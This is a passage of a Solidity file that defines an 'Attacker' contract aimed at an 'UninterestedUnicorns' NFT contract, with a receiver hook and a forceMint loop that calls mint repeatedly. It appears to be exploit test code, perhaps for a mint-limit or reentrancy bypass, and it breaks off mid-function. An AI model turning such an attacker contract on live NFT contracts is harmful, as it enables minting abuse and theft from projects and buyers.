...
contract Attacker is IERC721Receiver {
    IUninterestedUnicorns public UU =
        IUninterestedUnicorns(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
    CandyToken public UniC =
        CandyToken(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512);
    address payable public _uu;

    event Received(address, uint256);

    constructor() payable {}

    function forceMint(uint256 _quantity) public {
        for (uint256 i = 0; i < _quantity; i++) {
            UU.mint{value: 0.048 ether * _quantity}(_quantity);
        }
    }

    function setUU(address uu) public {
